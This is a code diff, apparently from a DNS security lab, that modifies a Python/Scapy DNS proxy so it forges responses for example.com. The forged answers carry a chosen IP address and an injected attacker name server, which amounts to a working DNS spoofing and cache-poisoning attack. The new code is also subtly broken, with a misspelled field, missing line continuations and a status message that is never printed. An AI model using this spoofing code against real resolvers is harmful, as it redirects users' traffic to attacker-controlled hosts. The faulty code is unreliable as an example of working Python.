@@ -18,7 +18,7 @@ dns_port = args.dns_port
 SPOOF = args.spoof_response
 # IP of localhost
 localhost = "127.0.0.1"
-too_be_spoofed = {'example.com': {
+to_be_spoofed = {'example.com.': {
 	'ipv4': '1.2.3.4',
 	'ns': 'ns.dnslabattacker.net'
 }}
@@ -43,11 +43,19 @@ def handler(data, addr, socket, dns_ip):
             print "Format Error: Request is not a DNS query"
         else:
             original_dns_packet = IP(server_response[2:])/UDP(server_response[2:])/DNS(server_response[2:])
-            print "ORIGINAL OBJECT\n", original_dns_packet.show()
-            print 
-            # dns_packet = IP(dst=server_response[IP].dst, src=server_response[IP].src) / UDP(server_response[2:]) / DNS(server_response[2:])
-            print "QUERIED URL", original_dns_packet[DNS].qd.qname
-            proxy_response = server_response[2:]
+            url = original_dns_packet[DNS].qd.qname
+            if url in to_be_spoofed:
+                print "Request for %s will be spoofed" % url[:-2]
+                spoofed_dns_packet = IP(dst=original_dns_packet[IP].dst, src=original_dns_packet[IP].src) /
+                    UDP(dport=original_dns_packet[UDP].dport, sport=original_dns_packet[UDP].sport) /
+                    DNS(id=original_dns_packet[DNS].id, qr=1, aa=1, qd=original_dns_packet[DNS].qd,
+                    an=DNSRR(rrname=original_dns_packet[DNS].qd.qname, ttl=original_dns_packet[DNS].an.ttl,rdata=to_be_spoofed[url]['ipv4']),
+                    ns=DNSRR(rrname=original_dns_packet[DNS].qd.qname, ttl=84107, type=NS, rdadta=to_be_spoofed[url]['ns']))
+                print "Spoofed packet", spoofed_dns_packet.show()
+                proxy_response = str(spoofed_dns_packet)
+            else:
+                "Request for %s will NOT be spoofed" % url[:-2]
+                proxy_response = server_response[2:]
             print "Sending DNS response to client"
             socket.sendto(proxy_response, addr)
             print "Success!"
